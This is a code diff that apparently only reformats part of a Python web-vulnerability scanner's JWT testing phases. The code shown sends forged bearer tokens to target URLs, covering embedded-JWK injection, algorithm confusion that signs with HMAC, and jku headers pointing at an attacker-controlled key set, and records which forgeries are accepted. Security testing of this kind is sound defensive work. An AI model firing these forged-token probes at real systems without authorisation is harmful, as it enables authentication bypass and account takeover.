@@ -950,9 +950,7 @@ def _rsa_jwk_to_pem(n_b64: str, e_b64: str) -> str:
     return "-----BEGIN PUBLIC KEY-----\n" + pem + "-----END PUBLIC KEY-----"
 
 
-async def _jwt_fetch_public_key(
-    urlopen: Any, url: str, timeout: int = 10
-) -> Optional[str]:
+async def _jwt_fetch_public_key(urlopen: Any, url: str, timeout: int = 10) -> Optional[str]:
     try:
         parsed = urllib.parse.urlparse(url)
         origin = f"{parsed.scheme or 'https'}://{parsed.netloc}"
@@ -977,11 +975,7 @@ async def _jwt_fetch_public_key(
             continue
         x5c = key.get("x5c") or []
         if x5c:
-            return (
-                "-----BEGIN CERTIFICATE-----\n"
-                + "\n".join(x5c)
-                + "\n-----END CERTIFICATE-----"
-            )
+            return "-----BEGIN CERTIFICATE-----\n" + "\n".join(x5c) + "\n-----END CERTIFICATE-----"
         n_b64 = key.get("n")
         e_b64 = key.get("e")
         if n_b64 and e_b64:
@@ -1218,7 +1212,8 @@ async def phase_24_JWT(
                             f"[jwt-jwk-injection] {url} — embedded attacker JWK in header: {forged_jwk_token[:80]}..."
                         )
                         jwk_req = urllib.request.Request(
-                            url, method="GET",
+                            url,
+                            method="GET",
                             headers={
                                 "User-Agent": "Mozilla/5.0",
                                 "Authorization": f"Bearer {forged_jwk_token}",
@@ -1227,7 +1222,9 @@ async def phase_24_JWT(
                         )
                         jwks, _, _ = await _async_urlopen(_j_urlopen, jwk_req, timeout=10)
                         if jwks == 200:
-                            results.append(f"[jwt-jwk-injection-accepted] {url} — embedded JWK token accepted (HTTP {jwks})")
+                            results.append(
+                                f"[jwt-jwk-injection-accepted] {url} — embedded JWK token accepted (HTTP {jwks})"
+                            )
                     except Exception:
                         pass
                     # Extended algorithm confusion: EdDSA→HS256, RS384→HS384, RS512→HS512
@@ -1238,15 +1235,19 @@ async def phase_24_JWT(
                     ]:
                         try:
                             import hmac as _hmac_e
+
                             confused_sig = _hmac_e.new(
                                 b"public_key_for_confusion",
                                 (parts[0] + "." + parts[1]).encode(),
                                 hmac_mod,
                             ).digest()
-                            confused_b64 = base64.urlsafe_b64encode(confused_sig).rstrip(b"=").decode()
+                            confused_b64 = (
+                                base64.urlsafe_b64encode(confused_sig).rstrip(b"=").decode()
+                            )
                             confused_token = f"{parts[0]}.{parts[1]}.{confused_b64}"
                             ec_req = urllib.request.Request(
-                                url, method="GET",
+                                url,
+                                method="GET",
                                 headers={
                                     "User-Agent": "Mozilla/5.0",
                                     "Authorization": f"Bearer {confused_token}",
@@ -1279,7 +1280,8 @@ async def phase_24_JWT(
                                 )
                                 forged_jku_token = f"{forged_jku_b64}.{parts[1]}.{parts[2]}"
                                 ajku_req = urllib.request.Request(
-                                    url, method="GET",
+                                    url,
+                                    method="GET",
                                     headers={
                                         "User-Agent": "Mozilla/5.0",
                                         "Authorization": f"Bearer {forged_jku_token}",
@@ -1745,7 +1747,8 @@ async def phase_36_JWTADV(
                         )
                         try:
                             aj_req = urllib.request.Request(
-                                url, method="GET",
+                                url,
+                                method="GET",
                                 headers={
                                     "User-Agent": "Mozilla/5.0",
                                     "Authorization": f"Bearer {forged_jwk_token}",
@@ -1754,7 +1757,9 @@ async def phase_36_JWTADV(
                             )
                             ajs, _, _ = await _async_urlopen(_ja_urlopen, aj_req, timeout=10)
                             if ajs == 200:
-                                findings.append(f"[jwtadv-jwk-injection-accepted] {url} — JWK injection accepted (HTTP {ajs})")
+                                findings.append(
+                                    f"[jwtadv-jwk-injection-accepted] {url} — JWK injection accepted (HTTP {ajs})"
+                                )
                         except Exception:
                             pass
                     # Extended algorithm confusion: EdDSA→HS256, RS384→HS384, RS512→HS512
@@ -1765,15 +1770,19 @@ async def phase_36_JWTADV(
                     ]:
                         try:
                             import hmac as _hmac_e2
+
                             confused_sig = _hmac_e2.new(
                                 b"public_key_confusion_test",
                                 (parts[0] + "." + parts[1]).encode(),
                                 hmac_mod,
                             ).digest()
-                            confused_b64 = base64.urlsafe_b64encode(confused_sig).rstrip(b"=").decode()
+                            confused_b64 = (
+                                base64.urlsafe_b64encode(confused_sig).rstrip(b"=").decode()
+                            )
                             confused_token = f"{parts[0]}.{parts[1]}.{confused_b64}"
                             ec2_req = urllib.request.Request(
-                                url, method="GET",
+                                url,
+                                method="GET",
                                 headers={
                                     "User-Agent": "Mozilla/5.0",
                                     "Authorization": f"Bearer {confused_token}",
@@ -1805,14 +1814,17 @@ async def phase_36_JWTADV(
                             forged_jku_token = f"{forged_jku_b64}.{parts[1]}.{parts[2]}"
                             try:
                                 ajku_req = urllib.request.Request(
-                                    url, method="GET",
+                                    url,
+                                    method="GET",
                                     headers={
                                         "User-Agent": "Mozilla/5.0",
                                         "Authorization": f"Bearer {forged_jku_token}",
                                         **_ja_extra_headers,
                                     },
                                 )
-                                ajkus, _, _ = await _async_urlopen(_ja_urlopen, ajku_req, timeout=10)
+                                ajkus, _, _ = await _async_urlopen(
+                                    _ja_urlopen, ajku_req, timeout=10
+                                )
                                 if ajkus == 200:
                                     findings.append(
                                         f"[jwtadv-jku-attacker-injection] {url} — JKU {ajku_url} accepted — attacker-controlled JWKS"
